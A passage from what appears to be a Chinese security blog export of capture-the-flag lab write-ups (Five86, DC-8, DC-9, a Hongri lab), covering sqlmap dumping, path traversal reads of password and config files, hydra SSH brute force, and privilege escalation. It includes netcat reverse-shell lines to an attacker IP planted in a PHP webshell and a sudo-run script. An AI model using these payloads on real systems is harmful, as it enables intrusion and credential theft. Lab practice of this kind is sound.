src="/assets/%E5%8F%8D%E5%BC%B9shell-20231024142547-cdpn6be.png" alt="反弹shell">​</p><h2 id="切换stephen"><a href="#切换stephen" class="headerlink" title="#切换stephen"></a>#切换stephen</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#信息收集 </span><br><span class="line">ls -ll</span><br><span class="line">sudo -l</span><br><span class="line">id </span><br><span class="line">#发现stephen所属pcap组</span><br><span class="line">进行流量抓包分析</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-24 134906](assets&#x2F;屏幕截图 2023-10-24 134906-20231024142601-m4mxkkv.png)​</p><p>​![屏幕截图 2023-10-24 134924](assets&#x2F;屏幕截图 2023-10-24 134924-20231024142601-9ny78ba.png)​</p><h2 id="抓包提权"><a href="#抓包提权" class="headerlink" title="#抓包提权"></a>#抓包提权</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#tcpdump -D 即使在低特权下，tcpdump仍具有捕获所有网络浏览的功能</span><br><span class="line"></span><br><span class="line">#检查”veth0c0a6b8”流量，并保存在pcap文件1.pcap</span><br><span class="line">#timeout 120为2分钟，-w将结果输出到文件，-i是指定监听端口</span><br><span class="line">cd /tmp</span><br><span class="line">timeout 120 tcpdump -w 1.pcap -i veth0c0a6b8</span><br><span class="line"></span><br><span class="line">tcpdump -r 1.pcap  </span><br><span class="line">#用-r读取流量包中的数据</span><br><span class="line">#在数据包中找到ftp用户paul    密码是esomepasswford</span><br><span class="line">#切换paul用户，查看sudo权限，paul可以使用peter的service命令</span><br><span class="line">sudo paul</span><br><span class="line">sudo -l</span><br><span class="line">#直接执行peter的/bin/bash，用相对目录找到/bin/bash的位置</span><br><span class="line">sudo -u peter service ../../bin/bash</span><br></pre></td></tr></table></figure><p>​![IP ADDR](assets&#x2F;IP ADDR-20231024142613-hezncwc.png)​</p><p>​<img src="/assets/PAULde%E5%AF%86%E7%A0%81-20231024142623-gt3gcec.png" alt="PAULde密码">​</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="#FLAG"></a>#FLAG</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#peter可以运行root用户的passwd命令，直接修改root密码</span><br><span class="line">sudo -u root passwd root</span><br><span class="line">#root</span><br><span class="line">cat /root/thisistheflag.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/PAUL-sudo-20231024142635-7iv2vus.png" alt="PAUL-sudo">​</p><p>​<img src="/assets/%E5%88%87%E6%8D%A2peter-20231024142635-a75zadn.png" alt="切换peter">​</p><p>​![屏幕截图 2023-10-24 141217](assets&#x2F;屏幕截图 2023-10-24 141217-20231024142635-fq9vuam.png)​</p><p>​<img src="/assets/%E8%AF%A5%E9%9D%A2%E8%86%9C%E6%8F%90%E6%9D%83-20231024142635-82w8buj.png" alt="该面膜提权">​</p>]]></content>
      
      
      <categories>
          
          <category> Five靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Five靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-9</title>
      <link href="/2024/04/11/DC/DC-9/"/>
      <url>/2024/04/11/DC/DC-9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h1><p>#主机探测-端口扫描 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -F -T4 -sS 192.168.43.13</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-1+2-20231018170338-0xave2p.png" alt="D9-1+2">​</p><p>‍</p><p>#指纹识别-目录爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.13</span><br><span class="line">dirsearch -u 192.168.43.13</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-3+4-20231018170651-sqyhz4x.png" alt="D9-3+4">​</p><p>#web界面</p><p>#直接AWVS跑–存在sql注入漏洞–result.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search存在注入漏洞</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-18 160941](assets&#x2F;屏幕截图 2023-10-18 160941-20231018170701-dn4z7xq.png)​</p><p>#sqlmap梭哈 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.43.13/results.php&quot; -data &quot;search=1&quot; -dbs</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.43.13/results.php&quot; -data &quot;search=1&quot; -D &#x27;users&#x27; --tables</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.43.13/results.php&quot; -data &quot;search=1&quot; -D &#x27;users&#x27; -T &#x27;UserDetails&#x27; --dump</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.43.13/results.php&quot; -data &quot;search=1&quot; -D &#x27;Staff&#x27; -T &#x27;users&#x27; --dump</span><br><span class="line"></span><br><span class="line">#把得到的账密保存下来，为后续ssh爆破做准备</span><br><span class="line">#存在一串密文“856f5de590ef37314e7c3bdf6f8a66dc ”  MD5解密---transorbital1</span><br><span class="line">#解密网站：https://www.somd5.com/</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-Staff-%E5%AD%97%E6%AE%B5-20231018170909-0j5cp5q.png" alt="D9-Staff-字段">​</p><p>​<img src="/assets/D9-%E5%AD%97%E6%AE%B5-20231018170909-lqxotjy.png" alt="D9-字段">​</p><p>​<img src="/assets/D9-%E5%BA%93-20231018170909-ddrmari.png" alt="D9-库">​</p><p>​<img src="/assets/D9-%E8%A1%A8-20231018170909-90mguff.png" alt="D9-表">​</p><p>‍</p><p>#登录web账密 </p><p>‍</p><p>​<img src="/assets/D9-%E7%99%BB%E5%BD%95-20231018170935-vu3hndz.png" alt="D9-登录">​</p><p>#存在任意文件读取漏洞</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#页面底部存在 “File does not exist&quot;</span><br><span class="line">#可能存在任意文件读取漏洞</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E5%AD%98%E5%9C%A8%E9%97%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-20231018170949-et5h5yv.png" alt="D9-存在问文件包含漏洞">​</p><p>#查看knock配置文件 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#由于之前nmap扫描时，22端口为filter状态，猜测应该是knock这个服务存在</span><br><span class="line">#利用file协议</span><br><span class="line">#?file=../../../../../../etc/knock.conf</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-kncok%E9%85%8D%E7%BD%AE-20231018170955-ktkhcnz.png" alt="D9-kncok配置">​</p><p>#海德拉爆破ssh账密</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#将之前保存下来的账密作为字典</span><br><span class="line">hydra -L user.txt -P miam.txt 192.168.43.13 ssh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E6%B5%B7%E5%BE%B7%E6%8B%89-20231018171303-00t84z5.png" alt="D9-海德拉">​</p><p>#三个用户ssh</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">joerty,chandleb,janitor</span><br><span class="line">ssh joerty#192.168.43.13</span><br><span class="line">ssh chandleb@192.168.43.13</span><br><span class="line">ssh janitor@192.168.43.13</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-18 152842](assets&#x2F;屏幕截图 2023-10-18 152842-20231018171319-xtiolia.png)​</p><p>​![屏幕截图 2023-10-18 152923](assets&#x2F;屏幕截图 2023-10-18 152923-20231018171319-8q8z3cp.png)​</p><p>​![屏幕截图 2023-10-18 152955](assets&#x2F;屏幕截图 2023-10-18 152955-20231018171319-nqylfen.png)​</p><p>#janitor存在多余目录</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看此目录--存在密码--追加miam.txt</span><br><span class="line">echo XXX,XXX,XXX &gt;&gt; miam.txt</span><br></pre></td></tr></table></figure><p>‍</p><p>#二次爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P miam.txt</span><br><span class="line">#得到jerey账密</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E7%88%86%E7%A0%B4%E6%96%B0%E7%9A%84ssh-20231018171425-7whsdu9.png" alt="D9-爆破新的ssh">​</p><p>#ssh登录 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jerey@192.168.43.13</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E7%99%BB%E5%BD%95fredf-20231018171438-95du81r.png" alt="D9-登录fredf">​</p><p>#提权 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#寻找提权方法</span><br><span class="line">sudo -l</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/opt/.../test/test下存在无密码可执行root权限文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E5%AF%BB%E6%89%BE%E6%8F%90%E6%9D%83-20231018171504-8fjhrwz.png" alt="D9-寻找提权">​</p><p>#FLAG </p><p>​<img src="/assets/FLAG-20231018171510-74pdrig.png" alt="FLAG">​</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-8</title>
      <link href="/2024/04/11/DC/DC-8/"/>
      <url>/2024/04/11/DC/DC-8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><p>#主机探测-端口扫描 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -F -T4 -sS -sV 192.168.43.12</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-a+nmap-20231017175358-gkm2gp5.png" alt="D8-a+nmap">​</p><p>#指纹识别-目录爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.43.12</span><br><span class="line">dirsearch -u http://192.168.43.12</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-what+dir-20231017175409-jzmtkec.png" alt="D8-what+dir">​</p><p>#Web界面-登录界面 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/login  --登陆界面</span><br></pre></td></tr></table></figure><p>‍</p><p>#URL存在Sql注入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首页存在sql注入</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-sql-20231017175413-mh1p87c.png" alt="D8-sql">​</p><p>#Sqlmap梭哈-</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">库</span><br><span class="line">sqlmap -u &quot;http://192.168.43.12/?nid=2&quot; --level=5 --risk=3 --batch -D --current-db</span><br><span class="line">表</span><br><span class="line">sqlmap -u &quot;http://192.168.43.12/?nid=2&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; --tables</span><br><span class="line">字段名</span><br><span class="line">sqlmap -u &quot;http://192.168.43.12/?nid=2&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -T &#x27;users&#x27; --columns</span><br><span class="line">字段</span><br><span class="line">sqlmap -u &quot;http://192.168.43.12/?nid=2&quot; --level=5 --risk=3 --batch -D &#x27;d7db&#x27; -T &#x27;users&#x27; -C &#x27;name,pass,uid&#x27; -dump</span><br><span class="line">#得到的账密保存下来---&gt;mima.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-sqlmap%E5%BA%93-20231017175423-qgmpvae.png" alt="D8-sqlmap库">​</p><p>‍</p><p>​<img src="/assets/D8-%E5%AD%97%E6%AE%B5-20231017175437-uvyyxnt.png" alt="D8-字段">​</p><p>​<img src="/assets/D8-%E5%AD%97%E6%AE%B5%E5%90%8D-20231017175437-9gc7b9s.png" alt="D8-字段名">​</p><p>​<img src="/assets/D8-%E8%A1%A8-20231017175437-z44nrya.png" alt="D8-表">​</p><p>‍</p><p>‍</p><p>#john猜解密码 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john mima.txt   ---turtal</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-%E4%BF%9D%E5%AD%98%E5%B9%B6john-20231017175454-7zynomy.png" alt="D8-保存并john">​</p><p>#web登录john-写马 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php system(&quot;nc -e /bin/bash 192.168.43.33 8888&quot;);?&gt;</span></span><br><span class="line">#返回主页提交表单</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-webshell-20231017175508-b4tjiep.png" alt="D8-webshell">​</p><p>#反弹shell  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lvvp 8888</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-%E5%8F%8D%E5%BC%B9webshell-20231017175517-fsj5ha6.png" alt="D8-反弹webshell">​</p><p>#SUID提权-exim </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">#存在exim</span><br><span class="line">exim --version  --</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-20231017175524-thdmz10.png" alt="D8-信息收集">​</p><p>#上传46996.sh到靶机 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim   ---找本地权限提升的脚本,也就是local privilege esc</span><br><span class="line">cp /usr/....../46996.sh .</span><br><span class="line">nc -lnvp 192.168.43.12 2333 &lt; 46996.sh</span><br><span class="line">靶机：</span><br><span class="line">nc 192.168.43.33 2333 &gt; 46996.sh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-exim+sploit-20231017175532-ozzepa3.png" alt="D8-exim+sploit">​</p><p>#运行脚本 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">chmod 777 46996.sh</span><br><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D8-%E6%9C%AC%E5%9C%B046996-20231017175545-d1pmfi5.png" alt="D8-本地46996"></p><p>​​<img src="/assets/D8-%E9%9D%B6%E6%9C%BA46666-20231017175556-fbu91w2.png" alt="D8-靶机46666">​</p><p>#FLAG​​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-17 170619](assets&#x2F;屏幕截图 2023-10-17 170619-20231017175605-fnb297h.png)​</p><p>​![屏幕截图 2023-10-17 170628](assets&#x2F;屏幕截图 2023-10-17 170628-20231017175610-sq5jn7t.png)​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Five靶机-3</title>
      <link href="/2024/04/11/five/five86-3/"/>
      <url>/2024/04/11/five/five86-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="five86-3"><a href="#five86-3" class="headerlink" title="five86-3"></a>five86-3</h1><p>#主机探测-端口扫描 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -A -p- -min-rate 8888 192.168.43.16</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F12-20231026121117-btbrc60.png" alt="F12">​</p><p>#指纹识别-目录爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.16</span><br><span class="line">dirsearch -u 192.168.43.16</span><br></pre></td></tr></table></figure><p>​<img src="/assets/F34-20231026121123-1m3wdvv.png" alt="F34">​</p><p>#web界面 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#CMS：drupal 7</span><br><span class="line">试了一圈dirsearch爆破出来的路径，没啥鸟用</span><br><span class="line">#随便注册个用户，返回时发现变成了admin用户</span><br><span class="line">#发现有图片上传</span><br><span class="line">#尝试上传木马</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fweb-20231026121129-huxm0w0.png" alt="Fweb">​</p><p>#BP抓包上传木马 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#先上传张图片抓包看看请求体</span><br><span class="line">#复制</span><br><span class="line">ontent-Disposition: form-data; name=&quot;files[picture_upload]&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">#再抓包上传马子</span><br><span class="line">#改包，改格式---&gt;上传成功</span><br><span class="line">#百度一圈发现这个思路没啥鸟用，找不到上传路径</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Fweb%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-20231026121200-43ciqgi.png" alt="Fweb文件上传">​</p><p>​<img src="/assets/F%E4%B8%8A%E7%A0%81%E5%AD%97-20231026121207-npff236.png" alt="F上码字">​</p><p>#搜drupal7的漏洞 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#发现任意文件读取漏洞</span><br><span class="line">#https://www.exploit-db.com/</span><br><span class="line">#Exploit Code:</span><br><span class="line">http://example.com/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd</span><br><span class="line">#kali curl一下 浏览器看实在麻烦</span><br><span class="line">#/etc/passwd  得到几个用户名</span><br><span class="line">curl http://192.168.43.16/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd</span><br><span class="line">#看下网站配置文件</span><br><span class="line">curl http://192.168.43.16/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../var/www/html/sites/default/settings.php</span><br><span class="line">#得到密码</span><br><span class="line">&#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;x4lB0XxX&#x27;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/EXPD7-20231026121228-dvebxmu.png" alt="EXPD7">​</p><p>​<img src="/assets/CURL%E7%9C%8B%E4%B8%80%E4%B8%8B-20231026121241-wkoz0mi.png" alt="CURL看一下"></p><p>​</p><p>#ssh敲门 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#唉，来个师傅解答一下：不指定22端口nmap就扫不到是咋回事</span><br><span class="line">#先扫下22端口</span><br><span class="line">nmap -p 22,80 -T4 -sT 192.168.43.16</span><br><span class="line">#22端口被过滤了，猜测是由于knock配置导致，毕竟之前也学到过</span><br><span class="line">#/etc/knockd.conf</span><br><span class="line">curl http://192.168.43.16/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/knockd.conf</span><br><span class="line">#15s内依次敲3个端口5004,4284,6872</span><br><span class="line">#端口看房状态维持60s，过后需要再敲。</span><br><span class="line">knock -d 200 192.168.43.16 5004 4284 6872</span><br><span class="line">#再次查看22端口---&gt;已是开启状态</span><br><span class="line">namp -p 22 -sT 192.168.43.16</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%AF%86%E7%A0%81-20231026121250-a9m5lu5.png" alt="配置文件的密码">​</p><p>#ssh登录</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#之前拿到了用户名和密码，hydra进行爆破</span><br><span class="line">knock -d 200 192.168.43.16 5004 4284 6872</span><br><span class="line">nmap -sT -p 22 192.168.43.16</span><br><span class="line">hydra -L user.txt -P m.txt</span><br><span class="line">#ssh登录sam</span><br><span class="line">ssh sam@192.168.43.16</span><br></pre></td></tr></table></figure><p>​<img src="/assets/SSH%E6%95%B2%E9%97%A8-20231026121259-13n2ym2.png" alt="SSH敲门">​</p><p>​<img src="/assets/%E6%95%B2%E9%97%A8+hydra+ssh%E7%99%BB%E5%BD%95-20231026121259-e97xp28.png" alt="敲门+hydra+ssh登录">​</p><p>#sam信息收集 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">#可root权限执行restart-web.sh</span><br><span class="line">#sam对web.sh具有读写权限</span><br></pre></td></tr></table></figure><p>#提取 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#提权</span><br><span class="line">echo  “nc -e /bin/bash 192.168.43.33 8888” &gt; restart-web.sh</span><br><span class="line">sudo ./restart-web.sh </span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8F%90%E6%9D%83NC-20231026121308-yj1zikg.png" alt="提权NC">​</p><p>#FLAG </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#kali反弹成功，拿到rootshell</span><br><span class="line">id</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/FLAG-20231026121315-5quf0m9.png" alt="FLAG">​</p>]]></content>
      
      
      <categories>
          
          <category> Five靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Five靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATK—CK红队评估实战靶场一</title>
      <link href="/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/"/>
      <url>/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="红日靶场01"><a href="#红日靶场01" class="headerlink" title="红日靶场01"></a>红日靶场01</h1><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><ul><li>红日靶场：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></li><li>靶机通用密码：hongrisec@2019</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali+CS</span><br><span class="line">192.168.43.33</span><br><span class="line">win7----admin@123</span><br><span class="line">外网：192.168.43.17</span><br><span class="line">内网：192.168.52.143</span><br><span class="line">可以Ping通外网</span><br><span class="line">通192.168.52.138（win2008）</span><br><span class="line">通192.168.52.141（win2003）</span><br><span class="line">小皮必须是自带的，下载的新版本会导致kali机连接目标失败</span><br><span class="line">问题原理：自行理解</span><br><span class="line">win2008---admin@123</span><br><span class="line">192.168.52.138</span><br><span class="line">win2003---admin@123</span><br><span class="line">192.168.52.141</span><br><span class="line">内网两台不出网win互通</span><br><span class="line">win7开启phpstudy</span><br><span class="line">win11访问80端口得到phpstudy探针</span><br></pre></td></tr></table></figure><p>​<img src="/assets/win2003-20231108121255-76cuk9q.png" alt="win2003">​</p><p>​<img src="/assets/win2008-20231108121255-inn925g.png" alt="win2008">​</p><p>​<img src="/assets/win7Ping-20231108121255-qoxgbul.png" alt="win7Ping">​</p><h2 id="二、外网渗透"><a href="#二、外网渗透" class="headerlink" title="二、外网渗透"></a>二、外网渗透</h2><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p -min-rate 10000 192.168.43.17</span><br><span class="line">#发现开启了80，3306端口</span><br><span 